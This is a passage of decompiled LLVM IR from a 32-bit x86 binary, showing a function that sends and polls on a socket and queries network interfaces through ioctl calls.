  %v2_8062a53 = inttoptr i32 %v1_8062a53 to i32*
  %v3_8062a53 = load i32, i32* %v2_8062a53, align 4
  store i32 %v3_8062a53, i32* @ebx, align 4
  br label %dec_label_pc_8062a5c

dec_label_pc_8062a5c:                             ; preds = %dec_label_pc_8062a13, %dec_label_pc_8062a4a
  %stack_var_-9000.0 = phi i32 [ %v3_8062a0d, %dec_label_pc_8062a4a ], [ %arg7, %dec_label_pc_8062a13 ]
  %storemerge3 = phi i32 [ %v3_8062a53, %dec_label_pc_8062a4a ], [ %arg6, %dec_label_pc_8062a13 ]
  %v4_8062a8d = icmp eq i32 %arg2, 0
  %v2_8062b69 = ptrtoint i32* %stack_var_-168 to i32
  %v2_8062b9e = ptrtoint i32* %stack_var_-28 to i32
  %v4_8062cd7 = and i8 %tmp88, 8
  %v5_8062cd7 = icmp eq i8 %v4_8062cd7, 0
  %v2_8062e01 = ptrtoint i32* %stack_var_-60 to i32
  %v2_8062e06 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8062d04 = ptrtoint i16* %stack_var_-76 to i32
  %v2_8062d0d = ptrtoint i32* %stack_var_-36 to i32
  %v2_8062d1e = ptrtoint i32* %stack_var_-8980 to i32
  %v4_8062d81 = and i8 %tmp80, 32
  %v5_8062d81 = icmp eq i8 %v4_8062d81, 0
  %v2_8062dae = ptrtoint i32* %stack_var_-72 to i32
  %v4_8062dbe = zext i16 %tmp79 to i32
  %v2_8062e7a = ptrtoint i32* %stack_var_-100 to i32
  %v2_8062e84 = ptrtoint i32* %stack_var_-180 to i32
  %v2_8062bd5 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8062c15 = ptrtoint i32* %stack_var_-132 to i32
  %v4_8062c3d = urem i8 %tmp89, 2
  %v5_8062c3d = icmp eq i8 %v4_8062c3d, 0
  %v4_8062b53 = icmp eq i32 %storemerge3, 0
  %v4_8062b5c = icmp eq i32 %stack_var_-9000.0, 0
  %v2_8062ab5 = ptrtoint i32* %stack_var_8 to i32
  %v1_8062b5a = icmp eq i1 %v4_8062b53, false
  br label %dec_label_pc_8062a84

dec_label_pc_8062a84:                             ; preds = %dec_label_pc_8062f1e, %dec_label_pc_8062a5c
  %v1_8062b6f59 = phi i32 [ %v15_80629ea, %dec_label_pc_8062a5c ], [ %v1_8062f17, %dec_label_pc_8062f1e ]
  %v0_8062a97 = phi i32 [ %v3_80629f5, %dec_label_pc_8062a5c ], [ %v0_8062a84.pre, %dec_label_pc_8062f1e ]
  %stack_var_-9016.0 = phi i32 [ %tmp90, %dec_label_pc_8062a5c ], [ %stack_var_-9016.2, %dec_label_pc_8062f1e ]
  %stack_var_-9012.0 = phi i32 [ %tmp92, %dec_label_pc_8062a5c ], [ %stack_var_-9012.2, %dec_label_pc_8062f1e ]
  %stack_var_-9004.0 = phi i32 [ 0, %dec_label_pc_8062a5c ], [ %stack_var_-9004.2, %dec_label_pc_8062f1e ]
  %stack_var_-9008.0 = phi i32 [ 0, %dec_label_pc_8062a5c ], [ %stack_var_-9008.2, %dec_label_pc_8062f1e ]
  %stack_var_-9020.0 = phi i32 [ 2, %dec_label_pc_8062a5c ], [ %v4_8062f1e, %dec_label_pc_8062f1e ]
  %stack_var_-9028.0 = phi i32 [ 0, %dec_label_pc_8062a5c ], [ %stack_var_-9028.2, %dec_label_pc_8062f1e ]
  %v1_8062a84 = add i32 %v0_8062a97, 56
  store i32 %v1_8062a84, i32* %eax.global-to-local, align 4
  br i1 %v4_8062a8d, label %dec_label_pc_8062b69, label %dec_label_pc_8062acf

dec_label_pc_8062acf:                             ; preds = %dec_label_pc_8062a84
  %v2_8062a97 = inttoptr i32 %v1_8062a84 to i32*
  store i32 0, i32* %v2_8062a97, align 4
  %v1_8062a9e = load i32, i32* @esp, align 4
  %v2_8062a9e = add i32 %v1_8062a9e, -4
  %v3_8062a9e = inttoptr i32 %v2_8062a9e to i32*
  store i32 %v2_8062e84, i32* %v3_8062a9e, align 4
  store i32 %v1_8062a84, i32* %edx.global-to-local, align 4
  %v2_8062aa5 = add i32 %v1_8062a9e, -8
  %v3_8062aa5 = inttoptr i32 %v2_8062aa5 to i32*
  store i32 %v2_8062e84, i32* %v3_8062aa5, align 4
  %v0_8062aa6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062aa6 = add i32 %v0_8062aa6, 4
  %v2_8062aa6 = inttoptr i32 %v1_8062aa6 to i32*
  %v3_8062aa6 = load i32, i32* %v2_8062aa6, align 4
  store i32 %v3_8062aa6, i32* %eax.global-to-local, align 4
  %v0_8062aa9 = load i32, i32* @esi, align 4
  %v1_8062aa9 = add i32 %v0_8062aa9, 80
  %v2_8062aa9 = inttoptr i32 %v1_8062aa9 to i32*
  %v3_8062aa9 = load i32, i32* %v2_8062aa9, align 4
  %v5_8062aa9 = add i32 %v1_8062a9e, -12
  %v6_8062aa9 = inttoptr i32 %v5_8062aa9 to i32*
  store i32 %v3_8062aa9, i32* %v6_8062aa9, align 4
  %v0_8062aac = load i32, i32* %edx.global-to-local, align 4
  %v2_8062aac = add i32 %v1_8062a9e, -16
  %v3_8062aac = inttoptr i32 %v2_8062aac to i32*
  store i32 %v0_8062aac, i32* %v3_8062aac, align 4
  %v1_8062aad = add i32 %v1_8062a9e, -20
  %v2_8062aad = inttoptr i32 %v1_8062aad to i32*
  store i32 134621872, i32* %v2_8062aad, align 4
  %v3_8062aad = load i32, i32* %eax.global-to-local, align 4
  %v4_8062aad = add i32 %v3_8062aad, 20
  %v5_8062aad = inttoptr i32 %v4_8062aad to i32*
  %v6_8062aad = load i32, i32* %v5_8062aad, align 4
  call void @__pseudo_call(i32 %v6_8062aad)
  %v0_8062ab0 = load i32, i32* @esi, align 4
  %v1_8062ab0 = add i32 %v0_8062ab0, 88
  %v2_8062ab0 = inttoptr i32 %v1_8062ab0 to i32*
  %v3_8062ab0 = load i32, i32* %v2_8062ab0, align 4
  store i32 %v3_8062ab0, i32* %eax.global-to-local, align 4
  %v1_8062ab3 = inttoptr i32 %v3_8062ab0 to i32*
  %v2_8062ab3 = load i32, i32* %v1_8062ab3, align 4
  %v3_8062ab3 = add i32 %v2_8062ab3, 1
  store i32 %v3_8062ab3, i32* %v1_8062ab3, align 4
  store i32 %v2_8062ab5, i32* %eax.global-to-local, align 4
  %v0_8062ab8 = load i32, i32* @esp, align 4
  %v1_8062ab8 = inttoptr i32 %v0_8062ab8 to i32*
  %v3_8062ab8 = add i32 %v0_8062ab8, 4
  store i32 %v1_8062a84, i32* %ecx.global-to-local, align 4
  %v1_8062abf = inttoptr i32 %v3_8062ab8 to i32*
  %v1_8062ac0 = add i32 %v0_8062a97, 60
  %v2_8062ac0 = inttoptr i32 %v1_8062ac0 to i32*
  %v3_8062ac0 = load i32, i32* %v2_8062ac0, align 4
  store i32 %v3_8062ac0, i32* %edx.global-to-local, align 4
  store i32 %v2_8062ab5, i32* %v1_8062abf, align 4
  %v0_8062ac4 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8062ac4, i32* %v1_8062ab8, align 4
  %v1_8062ac5 = add i32 %v0_8062ab8, -4
  %v2_8062ac5 = inttoptr i32 %v1_8062ac5 to i32*
  store i32 134621896, i32* %v2_8062ac5, align 4
  %v3_8062ac5 = load i32, i32* %edx.global-to-local, align 4
  %v4_8062ac5 = add i32 %v3_8062ac5, 4
  %v5_8062ac5 = inttoptr i32 %v4_8062ac5 to i32*
  %v6_8062ac5 = load i32, i32* %v5_8062ac5, align 4
  call void @__pseudo_call(i32 %v6_8062ac5)
  %v0_8062ac8 = load i32, i32* @esp, align 4
  store i32 %tmp111, i32* @ebx, align 4
  %v2_8062ad2 = load i32, i32* %arg1, align 4
  store i32 %v2_8062ad2, i32* %eax.global-to-local, align 4
  %v0_8062ad4 = load i32, i32* %edx.global-to-local, align 4
  %v2_8062ad4 = add i32 %v0_8062ac8, 12
  %v3_8062ad4 = inttoptr i32 %v2_8062ad4 to i32*
  store i32 %v0_8062ad4, i32* %v3_8062ad4, align 4
  %v0_8062ad5 = load i32, i32* %edx.global-to-local, align 4
  %v2_8062ad5 = add i32 %v0_8062ac8, 8
  %v3_8062ad5 = inttoptr i32 %v2_8062ad5 to i32*
  store i32 %v0_8062ad5, i32* %v3_8062ad5, align 4
  %v1_8062ad6 = add i32 %v2_8062ad2, 32
  %v2_8062ad6 = inttoptr i32 %v1_8062ad6 to i32*
  %v3_8062ad6 = load i32, i32* %v2_8062ad6, align 4
  store i32 %v3_8062ad6, i32* %edx.global-to-local, align 4
  %v5_8062ad9 = add i32 %v0_8062ac8, 4
  %v6_8062ad9 = inttoptr i32 %v5_8062ad9 to i32*
  store i32 %v1_8062a84, i32* %v6_8062ad9, align 4
  %v3_8062adf = inttoptr i32 %v0_8062ac8 to i32*
  store i32 %v2_8062ad2, i32* %v3_8062adf, align 4
  %v1_8062ae0 = add i32 %v0_8062ac8, -4
  %v2_8062ae0 = inttoptr i32 %v1_8062ae0 to i32*
  store i32 134621923, i32* %v2_8062ae0, align 4
  %v3_8062ae0 = load i32, i32* %edx.global-to-local, align 4
  %v4_8062ae0 = add i32 %v3_8062ae0, 4
  %v5_8062ae0 = inttoptr i32 %v4_8062ae0 to i32*
  %v6_8062ae0 = load i32, i32* %v5_8062ae0, align 4
  call void @__pseudo_call(i32 %v6_8062ae0)
  %v0_8062ae3 = load i32, i32* @esp, align 4
  %v1_8062ae6 = icmp eq i32 %v2_8062ad2, 0
  br i1 %v1_8062ae6, label %dec_label_pc_8062aff, label %dec_label_pc_8062b10

dec_label_pc_8062aff:                             ; preds = %dec_label_pc_8062acf
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8062b04 = load i32, i32* @esi, align 4
  %v1_8062b04 = add i32 %v0_8062b04, 44
  %v2_8062b04 = inttoptr i32 %v1_8062b04 to i32*
  store i32 1, i32* %v2_8062b04, align 4
  br label %dec_label_pc_8062f33

dec_label_pc_8062b10:                             ; preds = %dec_label_pc_8062acf
  %v2_8062aea = add i32 %v0_8062ae3, 12
  %v3_8062aea = inttoptr i32 %v2_8062aea to i32*
  store i32 %v2_8062ad2, i32* %v3_8062aea, align 4
  %v2_8062aeb = add i32 %v0_8062ae3, 8
  %v3_8062aeb = inttoptr i32 %v2_8062aeb to i32*
  store i32 %v2_8062ad2, i32* %v3_8062aeb, align 4
  %v5_8062aec = add i32 %v0_8062ae3, 4
  %v6_8062aec = inttoptr i32 %v5_8062aec to i32*
  store i32 %arg3, i32* %v6_8062aec, align 4
  %v6_8062aef = inttoptr i32 %v0_8062ae3 to i32*
  store i32 %v1_8062a84, i32* %v6_8062aef, align 4
  %v1_8062af5 = add i32 %v0_8062ae3, -4
  %v2_8062af5 = inttoptr i32 %v1_8062af5 to i32*
  store i32 134621944, i32* %v2_8062af5, align 4
  call void @__pseudo_call(i32 %arg2)
  %v0_8062af8 = load i32, i32* @esp, align 4
  store i32 %v1_8062a84, i32* %edx.global-to-local, align 4
  %v3_8062b19 = load i32, i32* %v2_8062ac0, align 4
  store i32 %v3_8062b19, i32* %eax.global-to-local, align 4
  %v3_8062b1c = inttoptr i32 %v0_8062af8 to i32*
  store i32 %v1_8062a84, i32* %v3_8062b1c, align 4
  %v1_8062b1d = add i32 %v0_8062af8, -4
  %v2_8062b1d = inttoptr i32 %v1_8062b1d to i32*
  store i32 134621984, i32* %v2_8062b1d, align 4
  %v3_8062b1d = load i32, i32* %eax.global-to-local, align 4
  %v4_8062b1d = add i32 %v3_8062b1d, 16
  %v5_8062b1d = inttoptr i32 %v4_8062b1d to i32*
  %v6_8062b1d = load i32, i32* %v5_8062b1d, align 4
  call void @__pseudo_call(i32 %v6_8062b1d)
  %v0_8062b20 = load i32, i32* @esp, align 4
  %v1_8062b20 = add i32 %v0_8062b20, 16
  %v0_8062b23 = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062b29

dec_label_pc_8062b29:                             ; preds = %dec_label_pc_8062ca5, %dec_label_pc_8062c91, %dec_label_pc_8062b10
  %v1_8062b29 = phi i32 [ %v1_8062c32, %dec_label_pc_8062c91 ], [ %v1_8062c32, %dec_label_pc_8062ca5 ], [ %v1_8062b20, %dec_label_pc_8062b10 ]
  %stack_var_-9016.1 = phi i32 [ %stack_var_-9016.3161, %dec_label_pc_8062c91 ], [ %stack_var_-9016.3161, %dec_label_pc_8062ca5 ], [ %stack_var_-9016.0, %dec_label_pc_8062b10 ]
  %stack_var_-9012.1 = phi i32 [ %v0_8062bc6, %dec_label_pc_8062c91 ], [ %v0_8062bc6, %dec_label_pc_8062ca5 ], [ %stack_var_-9012.0, %dec_label_pc_8062b10 ]
  %stack_var_-9004.1 = phi i32 [ %stack_var_-9004.3.lcssa, %dec_label_pc_8062c91 ], [ %stack_var_-9004.3.lcssa, %dec_label_pc_8062ca5 ], [ %stack_var_-9004.0, %dec_label_pc_8062b10 ]
  %stack_var_-9008.1 = phi i32 [ %storemerge7.in.lcssa, %dec_label_pc_8062c91 ], [ %storemerge7.in.lcssa, %dec_label_pc_8062ca5 ], [ %stack_var_-9008.0, %dec_label_pc_8062b10 ]
  %stack_var_-9028.1 = phi i32 [ %stack_var_-9028.2, %dec_label_pc_8062c91 ], [ %stack_var_-9028.2, %dec_label_pc_8062ca5 ], [ %v0_8062b23, %dec_label_pc_8062b10 ]
  %v0_8062b29 = load i32, i32* @edi, align 4
  %v2_8062b29 = add i32 %v1_8062b29, -4
  %v3_8062b29 = inttoptr i32 %v2_8062b29 to i32*
  store i32 %v0_8062b29, i32* %v3_8062b29, align 4
  %v0_8062b2a = load i32, i32* @edi, align 4
  %v2_8062b2a = add i32 %v1_8062b29, -8
  %v3_8062b2a = inttoptr i32 %v2_8062b2a to i32*
  store i32 %v0_8062b2a, i32* %v3_8062b2a, align 4
  %v0_8062b2b = load i32, i32* @esi, align 4
  %v1_8062b2b = add i32 %v0_8062b2b, 24
  %v2_8062b2b = inttoptr i32 %v1_8062b2b to i32*
  %v3_8062b2b = load i32, i32* %v2_8062b2b, align 4
  %v5_8062b2b = add i32 %v1_8062b29, -12
  %v6_8062b2b = inttoptr i32 %v5_8062b2b to i32*
  store i32 %v3_8062b2b, i32* %v6_8062b2b, align 4
  %v0_8062b2e = load i32, i32* @esi, align 4
  %v1_8062b2e = add i32 %v0_8062b2e, 8
  store i32 %v1_8062b2e, i32* %eax.global-to-local, align 4
  %v2_8062b31 = add i32 %v1_8062b29, -16
  %v3_8062b31 = inttoptr i32 %v2_8062b31 to i32*
  store i32 %v1_8062b2e, i32* %v3_8062b31, align 4
  %v1_8062b32 = add i32 %v1_8062b29, -20
  %v2_8062b32 = inttoptr i32 %v1_8062b32 to i32*
  store i32 0, i32* %v2_8062b32, align 4
  %v5_8062b34 = add i32 %v1_8062b29, -24
  %v6_8062b34 = inttoptr i32 %v5_8062b34 to i32*
  store i32 %stack_var_-9028.1, i32* %v6_8062b34, align 4
  %v0_8062b3a = load i32, i32* @esi, align 4
  %v1_8062b3a = add i32 %v0_8062b3a, 88
  %v2_8062b3a = inttoptr i32 %v1_8062b3a to i32*
  %v3_8062b3a = load i32, i32* %v2_8062b3a, align 4
  %v5_8062b3a = add i32 %v1_8062b29, -28
  %v6_8062b3a = inttoptr i32 %v5_8062b3a to i32*
  store i32 %v3_8062b3a, i32* %v6_8062b3a, align 4
  %v0_8062b3d = load i32, i32* @esi, align 4
  %v1_8062b3d = inttoptr i32 %v0_8062b3d to i32*
  %v2_8062b3d = load i32, i32* %v1_8062b3d, align 4
  %v4_8062b3d = add i32 %v1_8062b29, -32
  %v5_8062b3d = inttoptr i32 %v4_8062b3d to i32*
  store i32 %v2_8062b3d, i32* %v5_8062b3d, align 4
  %v6_8062b3f = call i32 @__libc_sendto(i32 %stack_var_-9028.1, i32 %v2_8062a05, i32 %stack_var_-9020.0, i32 %stack_var_-9016.1, i32 %stack_var_-9012.1, i32 %stack_var_-9008.1)
  store i32 %v6_8062b3f, i32* %eax.global-to-local, align 4
  %v0_8062b44 = load i32, i32* @esp, align 4
  %v1_8062b44 = add i32 %v0_8062b44, 32
  %v15_8062b47 = icmp eq i32 %v6_8062b3f, %stack_var_-9028.1
  %v1_8062b4d = icmp eq i1 %v15_8062b47, false
  br i1 %v1_8062b4d, label %dec_label_pc_8062a27, label %dec_label_pc_8062b53

dec_label_pc_8062b53:                             ; preds = %dec_label_pc_8062b29
  br i1 %v1_8062b5a, label %dec_label_pc_8062b69, label %dec_label_pc_8062b5c

dec_label_pc_8062b5c:                             ; preds = %dec_label_pc_8062b53
  br i1 %v4_8062b5c, label %dec_label_pc_8062b5c.dec_label_pc_8062cb7_crit_edge, label %dec_label_pc_8062b69

dec_label_pc_8062b5c.dec_label_pc_8062cb7_crit_edge: ; preds = %dec_label_pc_8062b5c
  %v0_8062cbc.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062cb7

dec_label_pc_8062b69:                             ; preds = %dec_label_pc_8062b5c, %dec_label_pc_8062b53, %dec_label_pc_8062a84
  %v1_8062b6f = phi i32 [ %v1_8062b6f59, %dec_label_pc_8062a84 ], [ %v1_8062b44, %dec_label_pc_8062b53 ], [ %v1_8062b44, %dec_label_pc_8062b5c ]
  %stack_var_-9016.2 = phi i32 [ %stack_var_-9016.0, %dec_label_pc_8062a84 ], [ %stack_var_-9016.1, %dec_label_pc_8062b53 ], [ %stack_var_-9016.1, %dec_label_pc_8062b5c ]
  %stack_var_-9012.2 = phi i32 [ %stack_var_-9012.0, %dec_label_pc_8062a84 ], [ %stack_var_-9012.1, %dec_label_pc_8062b53 ], [ %stack_var_-9012.1, %dec_label_pc_8062b5c ]
  %stack_var_-9004.2 = phi i32 [ %stack_var_-9004.0, %dec_label_pc_8062a84 ], [ %stack_var_-9004.1, %dec_label_pc_8062b53 ], [ %stack_var_-9004.1, %dec_label_pc_8062b5c ]
  %stack_var_-9008.2 = phi i32 [ %stack_var_-9008.0, %dec_label_pc_8062a84 ], [ %stack_var_-9008.1, %dec_label_pc_8062b53 ], [ %stack_var_-9008.1, %dec_label_pc_8062b5c ]
  %stack_var_-9028.2 = phi i32 [ %stack_var_-9028.0, %dec_label_pc_8062a84 ], [ %stack_var_-9028.1, %dec_label_pc_8062b53 ], [ %stack_var_-9028.1, %dec_label_pc_8062b5c ]
  store i32 %v2_8062b69, i32* %eax.global-to-local, align 4
  %v0_8062b6f = load i32, i32* @ebx, align 4
  %v2_8062b6f = add i32 %v1_8062b6f, -4
  %v3_8062b6f = inttoptr i32 %v2_8062b6f to i32*
  store i32 %v0_8062b6f, i32* %v3_8062b6f, align 4
  %v1_8062b70 = add i32 %v1_8062b6f, -8
  %v2_8062b70 = inttoptr i32 %v1_8062b70 to i32*
  store i32 12, i32* %v2_8062b70, align 4
  %v1_8062b72 = add i32 %v1_8062b6f, -12
  %v2_8062b72 = inttoptr i32 %v1_8062b72 to i32*
  store i32 ptrtoint (i32* @global_var_807e520.853 to i32), i32* %v2_8062b72, align 4
  %v2_8062b77 = add i32 %v1_8062b6f, -16
  %v3_8062b77 = inttoptr i32 %v2_8062b77 to i32*
  store i32 %v2_8062b69, i32* %v3_8062b77, align 4
  %v3_8062b78 = inttoptr i32 %stack_var_-9028.2 to i16*
  %v4_8062b78 = call i32 @memcpy(i16* %v3_8062b78, i32 %v2_8062a05, i32 %stack_var_-9020.0)
  store i32 %v4_8062b78, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %ecx.global-to-local, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v0_8062b8f = load i32, i32* @esi, align 4
  %v1_8062b8f = inttoptr i32 %v0_8062b8f to i32*
  %v2_8062b8f = load i32, i32* %v1_8062b8f, align 4
  store i32 %v2_8062b8f, i32* %eax.global-to-local, align 4
  %v0_8062b91 = load i32, i32* @esp, align 4
  %v1_8062b91 = add i32 %v0_8062b91, 16
  store i32 %v2_8062b8f, i32* %stack_var_-28, align 4
  %v1_8062ced = add i32 %stack_var_-9028.2, 286
  %v1_8062cf5 = and i32 %v1_8062ced, -16
  br label %dec_label_pc_8062b9d

dec_label_pc_8062b9d:                             ; preds = %dec_label_pc_8062e59, %dec_label_pc_8062e68, %dec_label_pc_8062e3f.dec_label_pc_8062b9d.backedge_crit_edge, %dec_label_pc_8062b69
  %v1_8062b9d = phi i32 [ %v1_8062b91, %dec_label_pc_8062b69 ], [ %v1_8062b9d.pre.pre, %dec_label_pc_8062e3f.dec_label_pc_8062b9d.backedge_crit_edge ], [ %v1_8062e22, %dec_label_pc_8062e68 ], [ %v1_8062e22, %dec_label_pc_8062e59 ]
  %v0_8062b9d = phi i32 [ %arg5, %dec_label_pc_8062b69 ], [ %v0_8062b9d.pre.pre, %dec_label_pc_8062e3f.dec_label_pc_8062b9d.backedge_crit_edge ], [ %v6_8062e1d, %dec_label_pc_8062e68 ], [ %v6_8062e1d, %dec_label_pc_8062e59 ]
  %v2_8062b9d = add i32 %v1_8062b9d, -4
  %v3_8062b9d = inttoptr i32 %v2_8062b9d to i32*
  store i32 %v0_8062b9d, i32* %v3_8062b9d, align 4
  store i32 %v2_8062b9e, i32* %eax.global-to-local, align 4
  %v5_8062ba1 = add i32 %v1_8062b9d, -8
  %v6_8062ba1 = inttoptr i32 %v5_8062ba1 to i32*
  store i32 %v2_8062a05, i32* %v6_8062ba1, align 4
  %v1_8062ba7 = add i32 %v1_8062b9d, -12
  %v2_8062ba7 = inttoptr i32 %v1_8062ba7 to i32*
  store i32 1, i32* %v2_8062ba7, align 4
  %v2_8062ba9 = add i32 %v1_8062b9d, -16
  %v3_8062ba9 = inttoptr i32 %v2_8062ba9 to i32*
  store i32 %v2_8062b9e, i32* %v3_8062ba9, align 4
  %v1_8062baa = load i32, i32* %stack_var_-20, align 4
  %v5_8062baa = call i32 @__libc_poll(%pollfd* inttoptr (i32 1 to %pollfd*), i32 %v1_8062baa, i32 %v0_80629e9)
  store i32 %v5_8062baa, i32* %eax.global-to-local, align 4
  %v0_8062baf = load i32, i32* @esp, align 4
  %v1_8062baf = add i32 %v0_8062baf, 16
  %v10_8062bb2 = icmp eq i32 %v5_8062baa, -1
  br i1 %v10_8062bb2, label %dec_label_pc_8062cc8, label %dec_label_pc_8062bbb

dec_label_pc_8062bbb:                             ; preds = %dec_label_pc_8062b9d
  %v1_8062bbb = icmp eq i32 %v5_8062baa, 0
  %v1_8062bbd = icmp eq i1 %v1_8062bbb, false
  br i1 %v1_8062bbd, label %dec_label_pc_8062cd7, label %dec_label_pc_8062bc3

dec_label_pc_8062bc3:                             ; preds = %dec_label_pc_8062bbb
  %v0_8062bc3 = load i32, i32* @esi, align 4
  %v1_8062bc3 = inttoptr i32 %v0_8062bc3 to i32*
  %v2_8062bc3 = load i32, i32* %v1_8062bc3, align 4
  store i32 %v2_8062bc3, i32* %eax.global-to-local, align 4
  %v0_8062bc5 = load i32, i32* @edx, align 4
  %v2_8062bc5 = add i32 %v0_8062baf, 12
  %v3_8062bc5 = inttoptr i32 %v2_8062bc5 to i32*
  store i32 %v0_8062bc5, i32* %v3_8062bc5, align 4
  %v0_8062bc6 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8062bd5, i32* %eax.global-to-local, align 4
  %v2_8062bd8 = add i32 %v0_8062baf, 8
  %v3_8062bd8 = inttoptr i32 %v2_8062bd8 to i32*
  store i32 %v2_8062bd5, i32* %v3_8062bd8, align 4
  %v1_8062bd9 = add i32 %v0_8062baf, 4
  %v2_8062bd9 = inttoptr i32 %v1_8062bd9 to i32*
  store i32 35090, i32* %v2_8062bd9, align 4
  %v6_8062bde = inttoptr i32 %v0_8062baf to i32*
  store i32 %v0_8062bc6, i32* %v6_8062bde, align 4
  store i32 8800, i32* %stack_var_-44, align 4
  %v3_8062beb = call i32 @ioctl(i32 %v0_8062bc6, i32 %stack_var_-9008.2, i32 %stack_var_-9004.2)
  store i32 %v3_8062beb, i32* %eax.global-to-local, align 4
  %v1_8062bf3 = icmp eq i32 %v3_8062beb, 0
  %v1_8062bf5 = icmp eq i1 %v1_8062bf3, false
  br i1 %v1_8062bf5, label %dec_label_pc_8062e48, label %dec_label_pc_8062bfb

dec_label_pc_8062bfb:                             ; preds = %dec_label_pc_8062bc3
  %v0_8062bf0 = load i32, i32* @esp, align 4
  %v1_8062bf0 = add i32 %v0_8062bf0, 16
  %v3_8062bfb = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8062d1e, i32* %edx.global-to-local, align 4
  %v2_8062c01 = udiv i32 %v3_8062bfb, 32
  %tmp200 = icmp ult i32 %v3_8062bfb, 32
  store i32 %v2_8062c01, i32* @edi, align 4
  %tmp132158 = icmp eq i1 %tmp200, false
  br i1 %tmp132158, label %dec_label_pc_8062c0c, label %dec_label_pc_8062e48

dec_label_pc_8062c0c:                             ; preds = %dec_label_pc_8062bfb, %dec_label_pc_8062c50
  %stack_var_-9016.3161 = phi i32 [ %v4_8062c50, %dec_label_pc_8062c50 ], [ %v2_8062d1e, %dec_label_pc_8062bfb ]
  %v0_8062c0c160 = phi i32 [ %v3_8062c2d, %dec_label_pc_8062c50 ], [ %v3_8062beb, %dec_label_pc_8062bfb ]
  %v1_8062c0c159 = phi i32 [ %v1_8062c32, %dec_label_pc_8062c50 ], [ %v1_8062bf0, %dec_label_pc_8062bfb ]
  %v2_8062c0c = add i32 %v1_8062c0c159, -4
  %v3_8062c0c = inttoptr i32 %v2_8062c0c to i32*
  store i32 %v0_8062c0c160, i32* %v3_8062c0c, align 4
  %v1_8062c0d = add i32 %v1_8062c0c159, -8
  %v2_8062c0d = inttoptr i32 %v1_8062c0d to i32*
  store i32 32, i32* %v2_8062c0d, align 4
  %v5_8062c0f = add i32 %v1_8062c0c159, -12
  %v6_8062c0f = inttoptr i32 %v5_8062c0f to i32*
  store i32 %stack_var_-9016.3161, i32* %v6_8062c0f, align 4
  store i32 %v2_8062c15, i32* @ebx, align 4
  %v2_8062c18 = add i32 %v1_8062c0c159, -16
  %v3_8062c18 = inttoptr i32 %v2_8062c18 to i32*
  store i32 %v2_8062c15, i32* %v3_8062c18, align 4
  %v3_8062c19 = inttoptr i32 %stack_var_-9016.3161 to i16*
  %v4_8062c19 = call i32 @memcpy(i16* %v3_8062c19, i32 %v0_8062bc6, i32 %stack_var_-9008.2)
  store i32 %v4_8062c19, i32* %eax.global-to-local, align 4
  %v0_8062c1e = load i32, i32* @esp, align 4
  %v2_8062c21 = add i32 %v0_8062c1e, 8
  %v3_8062c21 = inttoptr i32 %v2_8062c21 to i32*
  store i32 %v2_8062c15, i32* %v3_8062c21, align 4
  %v1_8062c22 = add i32 %v0_8062c1e, 4
  %v2_8062c22 = inttoptr i32 %v1_8062c22 to i32*
  store i32 35091, i32* %v2_8062c22, align 4
  %v6_8062c27 = inttoptr i32 %v0_8062c1e to i32*
  store i32 %v0_8062bc6, i32* %v6_8062c27, align 4
  %v3_8062c2d = call i32 @ioctl(i32 %stack_var_-9016.3161, i32 %v0_8062bc6, i32 %stack_var_-9008.2)
  store i32 %v3_8062c2d, i32* %eax.global-to-local, align 4
  %v0_8062c32 = load i32, i32* @esp, align 4
  %v1_8062c32 = add i32 %v0_8062c32, 16
  %v2_8062c35 = icmp slt i32 %v3_8062c2d, 0
  br i1 %v2_8062c35, label %dec_label_pc_8062e48, label %dec_label_pc_8062c3d

dec_label_pc_8062c3d:                             ; preds = %dec_label_pc_8062c0c
  br i1 %v5_8062c3d, label %dec_label_pc_8062c50, label %dec_label_pc_8062c43

dec_label_pc_8062c43:                             ; preds = %dec_label_pc_8062c3d
  store i32 %stack_var_-9016.3161, i32* %ecx.global-to-local, align 4
  %v1_8062c49 = add i32 %stack_var_-9016.3161, 16
  %v2_8062c49 = inttoptr i32 %v1_8062c49 to i16*
  %v3_8062c49 = load i16, i16* %v2_8062c49, align 4
  %v12_8062c49 = icmp eq i16 %v3_8062c49, 2
  br i1 %v12_8062c49, label %dec_label_pc_8062c61, label %dec_label_pc_8062c50

dec_label_pc_8062c50:                             ; preds = %dec_label_pc_8062c43, %dec_label_pc_8062c3d
  %v4_8062c50 = add i32 %stack_var_-9016.3161, 32
  %v0_8062c57 = load i32, i32* @edi, align 4
  %v1_8062c57 = add i32 %v0_8062c57, -1
  store i32 %v1_8062c57, i32* @edi, align 4
  %tmp131 = icmp slt i32 %v1_8062c57, 1
  %tmp132 = icmp eq i1 %tmp131, false
  br i1 %tmp132, label %dec_label_pc_8062c0c, label %dec_label_pc_8062e48

dec_label_pc_8062c61:                             ; preds = %dec_label_pc_8062c43
  %v0_8062c61 = load i32, i32* @esi, align 4
  %v1_8062c61 = add i32 %v0_8062c61, 28
  %v2_8062c61 = inttoptr i32 %v1_8062c61 to i32*
  %v3_8062c61 = load i32, i32* %v2_8062c61, align 4
  store i32 %v3_8062c61, i32* @ebx, align 4
  %v5_8062c64 = add i32 %v3_8062c61, %stack_var_-9004.2
  %v1_8062c6a = add i32 %v0_8062c61, 32
  %v2_8062c6a = inttoptr i32 %v1_8062c6a to i32*
  %v3_8062c6a = load i32, i32* %v2_8062c6a, align 4
  store i32 %v3_8062c6a, i32* %eax.global-to-local, align 4
  %v5_8062c6d = add i32 %v3_8062c6a, %stack_var_-9008.2
  %v4_8062c85162 = add i32 %v5_8062c6d, -999999
  %v9_8062c85163 = sub i32 999998, %v5_8062c6d
  %v10_8062c85164 = and i32 %v9_8062c85163, %v5_8062c6d
  %v11_8062c85165 = icmp slt i32 %v10_8062c85164, 0
  %v12_8062c85166 = icmp eq i32 %v4_8062c85162, 0
  %v13_8062c85167 = icmp slt i32 %v4_8062c85162, 0
  %v3_8062c8f168 = icmp eq i1 %v13_8062c85167, %v11_8062c85165
  %v4_8062c8f169 = icmp eq i1 %v12_8062c85166, false
  %v5_8062c8f170 = and i1 %v4_8062c8f169, %v3_8062c8f168
